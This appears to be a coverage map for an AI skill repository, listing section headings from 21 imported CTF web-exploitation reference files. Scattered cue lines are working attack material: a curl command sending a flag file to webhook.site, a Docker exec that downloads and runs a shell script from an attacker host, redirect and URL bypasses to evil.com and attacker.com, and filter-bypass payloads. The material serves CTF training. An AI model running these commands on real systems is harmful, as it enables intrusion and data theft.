# Source Coverage Map

This map is the no-loss checklist for the imported source material. Each file listed here has a debrandized preservation copy under `references/imported/`.

- Source skill: `ctf-web`
- Target skill: `web-ctf`
- Preserved files: 21

## Imported files and topic cues

### `source-skill.md`

- CTF Web Exploitation
- Prerequisites
- Additional Resources
- When to Pivot
- First-Pass Workflow
- Business-logic invariant workflow: state transitions, value conservation, idempotency, quotas, tenant scoping, replay, reordering, concurrency, and time-window edges
- Information-disclosure channel map: errors, debug endpoints, DVCS/backups, configs, schemas, source maps, headers, exports, storage, observability, cache/CDN metadata, and role-based diffing
- Insecure-upload pipeline map: ingress, storage, validation, processors, scan queue, serving headers, CDN/cache, MIME/magic/extension mismatches, polyglots, archive traversal, metadata sinks, and presigned-header control
- Quick Start Commands
- Recon
- SQLi quick test
- JWT decode (no verification)
- Cookie decode (Flask)
- SSTI probes
- Request inspection
- First Questions to Answer
- High-Value Recon Checks
- Fast Pattern Map
- Common Chain Shapes
- Deep-Dive Notes
- Common Flag Locations

### `auth-and-access-2.md`

- CTF Web - Auth & Access Control Attacks (Part 2)
- Table of Contents
- std::unordered_set Bucket Collision Auth Bypass
- Flood registration: every entry collides in root's bucket
- Log in as root with an arbitrary password — loop gives up before compare
- nodeprep.prepare Homograph Username Collision
- SRP A=0, A=N Auth Bypass
- ArangoDB AQL MERGE Injection for Privilege Escalation

### `auth-and-access.md`

- CTF Web - Auth & Access Control Attacks
- Broken function-level authorization matrix: actor, action, transport, encoding, gateway headers, tenant selectors, and background jobs
- IDOR/BOLA matrix: subject, object, action, tenant, parent references, projection knobs, transport variants, and object ID seed sources
- Table of Contents
- Password/Secret Inference from Public Data
- Weak Signature/Hash Validation Bypass
- Client-Side Access Gate Bypass
- NoSQL Injection (MongoDB)
- Blind NoSQL with Binary Search
- Cookie Manipulation
- Public Admin Login Route Cookie Seeding
- Step 1: capture cookies from public admin-login route
- Step 2: use seeded session cookie on admin endpoints
- Step 3: authenticated endpoint discovery
- Host Header Bypass
- Broken Auth: Always-True Hash Check
- VULNERABLE:
- CORRECT:
- Affine Cipher OTP Brute-Force
- Generate all 312 possible OTPs
- Brute-force via requests
- TOTP Recovery via PHP srand(time()) Seed Weakness
- If admin registered at 2015-11-28 21:21:XX (seconds unknown)
- PHP srand(time()) seeds the PRNG with Unix timestamp
- Only 60 possible seeds to try (one per second in the minute)
- /proc/self/mem via HTTP Range Requests

### `auth-infra.md`

- CTF Web - OAuth, SAML & Infrastructure Auth Attacks
- Table of Contents
- OAuth/OIDC Exploitation
- Open Redirect Token Theft
- Open-redirect canonicalization matrix: userinfo, protocol-relative URLs, backslashes, fragments/query tricks, Unicode/IDNA, numeric IPs, double encoding, Host/X-Forwarded-* construction, and multi-hop OAuth/SSRF chains
- OAuth authorization with redirect_uri manipulation
- If redirect_uri validation is weak, steal tokens via open redirect
- Step 1: Craft malicious authorization URL
- Victim clicks → auth code sent to attacker's server
- Common redirect_uri bypasses:
- https://target.com/callback?next=https://evil.com
- https://target.com/callback/../@evil.com
- https://target.com/callback%23@evil.com  (fragment)
- https://target.com/callback/.evil.com
- https://target.com.evil.com  (subdomain)
- OIDC ID Token Manipulation
- If server accepts unsigned tokens (alg: none)
- Decode and modify
- Re-encode with alg:none
- OAuth State Parameter CSRF
- Missing or predictable state parameter allows CSRF
- Attacker initiates OAuth flow, captures callback URL with auth code
- Sends callback URL to victim → victim's session linked to attacker's OAuth account
- Detection: Check if state parameter is:
- 1. Present in authorization request

### `auth-jwt.md`

- CTF Web - JWT & JWE Token Attacks
- JWT/OIDC acceptance matrix: issuer, audience, token type, client, service, key ID, refresh rotation, and cross-service reuse
- Table of Contents
- Algorithm None
- Algorithm Confusion (RS256 to HS256)
- Weak Secret Brute-Force
- Unverified Signature
- JWK Header Injection
- JKU Header Injection
- 1. Host JWKS at attacker-controlled URL
- 2. Forge token pointing to attacker JWKS
- KID Path Traversal
- /dev/null returns empty bytes -> HMAC key is empty string
- JWT Balance Replay
- JWE Token Forgery with Exposed Public Key
- 1. Fetch the server's public key
- GET /api/key or extract from JWKS endpoint
- 2. Create JWK from public key
- 3. Forge claims (e.g., set balance to 999999)
- 4. Encrypt with server's public key
- 5. Send forged token as cookie/header
- AES Cookie Length-Field Truncation + CRC32 Swap
- 1. Register with a username that embeds the target field early.
- The challenge stores fields as key\xa1value\xf7, AES-encrypts them,
- then appends a 2-byte length and a 4-byte CRC32.

### `client-side-advanced.md`

- CTF Web - Advanced Client-Side Attacks
- Table of Contents
- Unicode Case Folding XSS Bypass
- CSS Font Glyph Width + Container Query Exfiltration
- Hyperscript CDN CSP Bypass
- PBKDF2 Prefix Timing Oracle via postMessage
- Client-Side HMAC Bypass via Leaked JS Secret
- Terminal Control Character Obfuscation
- Or: filter only printable chars that aren't followed by backspace
- CSP Bypass via Cloud Function Whitelisted Domain
- Google Cloud Function that serves exfiltration JS
- CSP Nonce Bypass via base Tag Hijacking
- Host malicious test.js on attacker server
- test.js content:
- XSSI via JSONP Callback with Cloud Function Exfiltration
- Step 1: Brute-force SHA1 cookie to recover numeric user ID
- Step 2: Access debug endpoint
- GET /debug/game-state?user_id={recovered_id}
- CSP Bypass via link prefetch
- Cross-Origin XSS via Shared Parent Domain Cookie Injection
- Chrome Unicode URL Normalization Bypass
- Fuzz Unicode chars that Chrome normalizes to specific ASCII
- Characters that normalize to ASCII equivalents:
- Application enforces max 6-character domain

### `client-side.md`

- CTF Web - Client-Side Attacks
- CSRF methodology: session model, SameSite, token binding, Origin/Referer checks, simple content types, method overrides, GET mutations, GraphQL, WebSocket, and OAuth flows
- Table of Contents
- XSS Payloads
- Basic
- Cookie Exfiltration
- Filter Bypass
- Hex/Unicode Bypass
- DOMPurify Bypass via Trusted Backend Routes
- JavaScript String Replace Exploitation
- Client-Side Path Traversal (CSPT)
- Cache Poisoning
- All visitors to /search?query=harmless get XSS
- X-Forwarded-Host CDN Template Fetch Poisoning
- Poison the cache
- Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
- Hidden DOM Elements
- React-Controlled Input Programmatic Filling
- Magic Link + Redirect Chain XSS
- Content-Type via File Extension
- DOM XSS via jQuery Hashchange
- Shadow DOM XSS
- DOM Clobbering + MIME Mismatch
- HTTP Request Smuggling via Cache Proxy
- CSS/JS Paywall Bypass

### `cves.md`

- CTF Web - CVEs & Browser Vulnerabilities
- Table of Contents
- CVE-2025-29927: Next.js Middleware Bypass
- CVE-2025-0167: Curl.netrc Credential Leakage
- Uvicorn CRLF Injection (Unpatched N-Day)
- Python urllib Scheme Validation Bypass (0-Day)
- App blocks http/https via urlsplit:
- Bypass: <URL:http://attacker.com/malicious.so>
- Also: %0ahttp://attacker.com/malicious.so (newline prefix)
- Chrome Referrer Leak via Link Header
- TCP Packet Splitting (Firewall Bypass)
- Puppeteer/Chrome JavaScript Bypass
- Python python-dotenv Injection
- HTTP Request Splitting via RFC 2047
- Waitress WSGI Cookie Exfiltration
- Deno Import Map Hijacking
- CVE-2025-8110: Gogs Symlink RCE
- CVE-2021-22204: ExifTool DjVu Perl Injection
- Broken Auth via Truthy Hash Check
- AAEncode/JJEncode JS Deobfuscation
- Protocol Multiplexing — SSH+HTTP on Same Port
- CVE-2024-28184: WeasyPrint Attachment SSRF / File Read
- CVE-2025-55182 / CVE-2025-66478: React Server Components Flight Protocol RCE
- CVE-2024-45409: Ruby-SAML XPath Digest Smuggling

### `field-notes.md`

- CTF Web Field Notes
- Table of Contents
- Reconnaissance
- SQL Injection Quick Reference
- SQLi workflow: query-shape classification, value-vs-identifier influence, quiet oracle selection, DBMS-specific primitive choice, ORM raw-fragment and JSON/XML/full-text/report-filter surfaces
- XSS Quick Reference
- XSS workflow: source-to-sink tracing, context classification, sanitizer/CSP/Trusted Types/MIME/hydration checks, and minimal context-specific proof across DOM, stored, reflected, framework, SVG/MathML, markdown, postMessage, storage, and file-metadata paths
- XSSI via JSONP Callback Exfiltration
- Path Traversal / LFI Quick Reference
- Traversal/LFI/RFI workflow: file-operation inventory, normalization probes, web-server/app decode mismatch checks, read-to-include/write/extract/wrapper/log-session/template escalation
- JWT Quick Reference
- SSTI Quick Reference
- RCE workflow: sink identification, quiet oracle selection, runtime/context confirmation, boundary mapping, and minimal proof across command injection, SSTI, deserialization, media converters, SSRF-to-admin, and container paths
- Jinja2 RCE
- Go template
- EJS
- Jinja2 quote bypass (keyword args):
- Python str.format() Attribute Traversal
- SSRF Quick Reference
- SSRF workflow: server-side fetcher inventory, OAST/timing oracle, loopback/RFC1918/link-local/IPv6/address-encoding checks, parser differentials, redirects, protocol handlers, header/method control, cloud metadata, and control-plane pivots
- Command Injection Quick Reference
- XXE Quick Reference
- PHP Type Juggling Quick Reference
- PHP File Inclusion / LFI Quick Reference
- Code Injection Quick Reference
- Java Deserialization
- Python Pickle Deserialization
- Race Conditions (Time-of-Check to Time-of-Use)
- Node.js Quick Reference

### `node-and-prototype.md`

- CTF Web - Node.js Prototype Pollution & VM Escape
- Table of Contents
- Prototype Pollution Basics
- Common Vectors
- Known Vulnerable Libraries
- flatnest Circular Reference Bypass
- Gadget: Library Settings via Prototype Chain
- Node.js VM Sandbox Escape
- ESM-Compatible Escape
- CommonJS Escape
- Why `document.write` Matters for Happy-DOM
- Full Chain: Prototype Pollution to VM Escape RCE (4llD4y)
- Step 1: Pollution via flatnest circular reference
- Step 2: RCE via VM escape in rendered HTML
- Lodash Prototype Pollution to Pug AST Injection
- Affected Libraries
- Detection

### `server-side-2.md`

- CTF Web - XXE, XML Injection, Command Injection, GraphQL
- Table of Contents
- XXE (XML External Entity)
- Basic XXE
- OOB XXE with External DTD
- XXE via DOCX/Office XML Upload
- Step 1: Create a minimal DOCX and extract it
- Step 2: Inject XXE into [Content_Types].xml
- Step 3: Repackage as DOCX
- Step 4: Upload to target
- Response or error message may contain base64-encoded file contents
- SVG XXE via svglib to PNG Pipeline
- XML Injection via X-Forwarded-For Header
- PHP Variable Variables ($$var) Abuse
- Supply a "safe" output variable name as key, protected variable name as value
- PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
- PHP uniqid() Predictable Filename
- Know approximate upload time (from server Date header, challenge hint, etc.)
- Sequential Regex Replacement Bypass
- Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
- Input: <scr<script>ipt>
- Pass 2 strips inner <script> → leaves: <script>
- The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
- Practical bypass — embed the dangerous string inside the blocked string:

### `server-side-advanced-2.md`

- CTF Web - Advanced Server-Side Techniques (Part 2)
- Table of Contents
- SSRF to Docker API RCE Chain
- Enumerate localhost ports through SSRF
- List containers
- Read files from container filesystem (returns tar archive)
- 1. Create exec instance
- Returns: {"Id": "<exec_id>"}
- 2. Start exec instance
- 1. Download shell script into container
- Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]
- 2. Execute with sh (not bash — busybox containers lack bash)
- Cmd: ["sh", "/tmp/shell.sh"]
- Castor XML Deserialization via xsi:type Polymorphism
- Start ysoserial JRMP listener
- Apache ErrorDocument Expression File Read
- SQLite File Path Traversal to Bypass String Equality
- HQL Injection via Non-Breaking Space
- HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
- H2 sees:  "select flag from flag limit 1" (valid SQL)
- Base64-Encoded Path Traversal
- ../index.php
- ../../etc/passwd
- Windows 8.3 Short Filename Path Traversal Bypass

### `server-side-advanced-3.md`

- CTF Web - Advanced Server-Side Techniques (Part 3)
- Table of Contents
- WAV Polyglot Upload Bypass via.wave Extension
- Multi-Slash URL Parser `path.startswith` Bypass
- Filtered
- Allowed
- Xalan XSLT math:random() Seed Guess
- SoapClient _user_agent CRLF Method Smuggling
- `gopher://` No-Host URL Scheme Bypass
- SSRF Credential Leak via Attacker-Specified Outbound URL
- Listener (attacker side)
- Victim sends:

### `server-side-advanced-4.md`

- Server-Side Advanced Techniques (Part 4)
- Table of Contents
- WeasyPrint SSRF & File Read
- Variant 1: Blind SSRF via Attachment Oracle
- Check for embedded attachment in PDF
- Blind extraction via charCodeAt oracle
- Variant 2: Local File Read via file:// Attachment
- MongoDB Regex Injection / $where Blind Oracle
- Find flag length
- Extract each character
- Pongo2 / Go Template Injection via Path Traversal
- ZIP Upload with PHP Webshell
- Create PHP webshell
- Access: http://target/uploads/<id>/shell.php
- basename() Bypass for Hidden Files
- basename() allows.lock,.htaccess, etc.
- .lock reveals secret filename
- wget CRLF Injection for SSRF-to-SMTP
- CRLF-injected URL targeting internal SMTP on port 25:
- Key: the port:25/ must come at the END to avoid "Bad port number" errors
- Build the CRLF-injected SMTP conversation
- URL-encode the SMTP commands for injection into the hostname
- Port must be at the end to avoid wget "Bad port number" error
- Trigger the SSRF

### `server-side-advanced.md`

- CTF Web - Advanced Server-Side Techniques
- Table of Contents
- ExifTool CVE-2021-22204 — DjVu Perl Injection
- Go Rune/Byte Length Mismatch + Command Injection
- If flag check uses: exec.Command("/bin/sh", "-c", fmt.Sprintf("test \"%s\" = \"%s\"", flag, input))
- Inject: ";od f*\n"
- Zip Symlink Path Traversal
- Create symlink to target file, zip with -y to preserve
- Upload → server follows symlink → exposes file content
- Path Traversal Bypass Techniques
- Brace Stripping
- Double URL Encoding
- Python os.path.join
- Nginx Alias Traversal to Leak.env
- Vulnerable Nginx configuration:
- Note: /laravel has NO trailing slash, but alias has one
- This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
- Exploit: traverse out of the public/ directory to read.env
- Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env
- Read application source
- Read other config files
- Leak Laravel.env file (contains APP_KEY, DB credentials, etc.)
- Test for the misconfiguration on common paths:
- Any location block using alias without matching trailing slashes

### `server-side-deser.md`

- CTF Web - Deserialization & Execution Attacks
- Table of Contents
- Java Deserialization (ysoserial)
- Generate payloads with ysoserial
- Common gadget chains (try in order):
- CommonsCollections1-7 (Apache Commons Collections)
- CommonsBeanutils1 (Apache Commons BeanUtils)
- URLDNS (no execution — DNS callback for blind detection)
- JRMPClient (triggers JRMP connection)
- Spring1/Spring2 (Spring Framework)
- Blind detection via DNS callback (no RCE needed):
- Send payload
- Python Pickle Deserialization
- For reverse shell:
- Using exec for multi-line payloads:
- Race Conditions (Time-of-Check to Time-of-Use)
- Turbo Intruder (Burp) — most reliable for precise timing
- Or use curl with GNU parallel:
- Pickle Chaining via STOP Opcode Stripping
- Strip STOP opcode from first payload, concatenate second
- Java XMLDecoder Deserialization RCE
- .NET JSON TypeNameHandling Deserialization
- Target: endpoint deserializing JSON with TypeNameHandling.All
- Generate Json.NET payload with ysoserial.net:

### `server-side-exec-2.md`

- CTF Web - Server-Side Code Execution & Access Attacks (Part 2)
- Table of Contents
- SQLi Keyword Fragmentation Bypass
- SQL WHERE Bypass via ORDER BY CASE
- SQL Injection via DNS Records
- Bash Brace Expansion for Space-Free Command Injection
- Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
- Exfiltrate via UDP when outbound TCP is blocked:
- Execute base64-encoded payload:
- Common Lisp Injection via Reader Macro
- .(ext:run-program "cat":arguments '("/flag"))
- .(run-shell-command "cat /flag")
- Pickle Chaining via STOP Opcode Stripping
- Java Deserialization (ysoserial)
- Python Pickle Deserialization
- Race Conditions (Time-of-Check to Time-of-Use)
- PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass
- 1. Calculate system_id from phpinfo() data
- Output: 39b005ad77428c42788140c6839e6201
- 2. Generate opcode cache locally (match PHP version)
- 3. Patch system_id in binary (bytes 9-40)
- 4. Upload via SQLi INTO DUMPFILE:
- include <stdlib.h>
- include <stdio.h>

### `server-side-exec.md`

- CTF Web - Server-Side Code Execution & Access Attacks
- Table of Contents
- Ruby Code Injection
- instance_eval Breakout
- Template: apply_METHOD('VALUE')
- Inject VALUE as: valid');PAYLOAD#
- Result: apply_METHOD('valid');PAYLOAD#')
- Bypassing Keyword Blocklists
- Exfiltration
- Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
- Ruby ObjectSpace Memory Scanning for Flag Extraction
- When you can't access the flag variable directly:
- Method 1: ObjectSpace heap scan
- Method 2: Monkey-patch to access private methods
- If object 'p' has private method 'flag':
- Method 3: Use send() to bypass private visibility
- Method 4: Use method() to get method object
- Perl open() RCE
- Exploit: "|command_here" or "command|"
- LaTeX Injection RCE
- Server-Side JS eval Blocklist Bypass
- PHP preg_replace /e Modifier RCE
- PHP Backtick Eval Under Character Limit
- PHP assert() String Evaluation Injection

### `server-side.md`

- CTF Web - Server-Side Injection Attacks
- Table of Contents
- PHP Type Juggling
- Send integer 0 instead of string to bypass strcmp/==
- PHP: 0 == "any_non_numeric_string" → true
- strcmp(array, string) returns NULL, which == 0 == false
- PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) passes
- PHP File Inclusion / php://filter
- Base64-encode prevents PHP execution, leaks raw source
- Returns: PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
- Output: <?php $password = "s3cr3t";...
- Chain convert filters to write arbitrary content
- SQL Injection
- Python str.format() Attribute Traversal
- Leak object attributes via format string
- In Flask: endpoint uses new_name.format(player_object)
- Send: {0.pykemon} to leak all pykemon objects
- Access nested attributes
- Dictionary key access via bracket notation
- Chaining attribute and index access
- Vulnerable: user input as format string
- Vulnerable: format with request object
- Safe alternative: use positional or keyword args only
- SSTI (Server-Side Template Injection)

### `sql-injection.md`

- CTF Web - SQL Injection Techniques
- Table of Contents
- Backslash Escape Quote Bypass
- Query: SELECT * FROM users WHERE username='$user' AND password='$pass'
- With username=\: WHERE username='\' AND password='...'
- Hex Encoding for Quote Bypass
- Second-Order SQL Injection
- Step 1: Store malicious payload (safely escaped during INSERT)
- Step 2: Trigger — payload retrieved from DB and used unsafely
- Common triggers: password change, profile update, search using stored value
- UPDATE users SET password='hacked' WHERE username='admin'- -'
- Result: admin password changed
- SQLi LIKE Character Brute-Force
- MySQL Column Truncation
- VARCHAR(20) column — pad "admin" (5 chars) to exceed column width
- MySQL truncates to "admin               " → matches "admin" in comparisons
- Register duplicate admin with attacker password
- Login as admin with attacker password
- SQLi to SSTI Chain
- Final: username=x\&password=) union select 1, {hex_payload}#
- MySQL information_schema.processList Trick
- WAF Bypass via XML Entity Encoding
- SQLi via EXIF Metadata Injection
- Set EXIF Comment field to SQL payload

### `web3.md`

- CTF Web - Web3 / Blockchain Challenges
- Table of Contents
- Challenge Infrastructure Pattern
- Auth Implementation (Python)
- EIP-1967 Proxy Pattern Exploitation
- ABI Coder v1 vs v2 - Dirty Address Bypass
- Solidity CBOR Metadata Stripping for Codehash Bypass
- Non-Standard ABI Calldata Encoding
- Solidity bytes32 String Encoding
- Proxy Upgrade and Crafted Calldata Exploit Flow
- Delegatecall Storage Context Abuse
- Deploy attacker
- Hijack governance
- Execute delegatecall
- Drain
- Groth16 Proof Forgery for Blockchain Governance
- When vk_delta_2 == vk_gamma_2, set:
- This verifies for ANY public inputs
- Phantom Market Unresolve + Force-Funding
- Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)
- Compare Yul output — if storage_set_to_zero_ calls change to
- transient_storage_set_to_zero_ in 0.8.34, the contract was affected
- Reentrancy Attack - DAO Pattern
- Deploy and trigger via web3.py / Foundry:

## Preservation rules

- Treat imported references as deep technique banks, not as routing documents.
- If a preserved section duplicates a stronger local methodology, prefer the local `offensive-techniques` workflow and use the preserved section for edge cases.
- Keep all future edits debrandized: no Task titles, competition names, platform names, or machine labels.
